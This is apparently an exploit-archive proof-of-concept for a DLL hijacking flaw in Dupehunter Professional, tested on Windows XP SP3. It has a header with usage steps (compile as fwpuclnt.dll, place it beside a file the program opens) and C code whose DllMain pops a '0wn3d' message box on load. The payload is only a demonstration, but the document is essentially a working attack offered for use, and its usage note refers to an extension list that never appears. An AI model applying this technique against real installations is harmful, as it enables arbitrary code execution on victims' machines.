/*
#Dupehunter Professional DLL Hijacking Exploit (fwpuclnt.dll)
#Author : anT!-Tr0J4n
#Greetz : Dev-PoinT.com ~ inj3ct0r.com  ~ All Dev-poinT members and my friends
#Email  : D3v-PoinT[at]hotmail[d0t]com & C1EH[at]Hotmail[d0t]com
#Software Link:http://www.dupehunter.com
#Tested on: Windows XP sp3
# Home : www.Dev-PoinT.com

#####################
How  TO use : Compile and rename to " fwpuclnt.dll " , create a file in the same dir with one of the following extensions.
check the result > Hack3d             
#####################

#fwpuclnt.dll (code)
*/
 
#include "stdafx.h"
 
void init() {
MessageBox(NULL,"Your System 0wn3d BY anT!-Tr0J4n", "anT!-Tr0J4n",0x00000003);
}
 
 
BOOL APIENTRY DllMain( HANDLE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
 )
{
    switch (ul_reason_for_call)
{
case DLL_PROCESS_ATTACH:
 init();break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
 case DLL_PROCESS_DETACH:
break;
    }
    return TRUE;
}
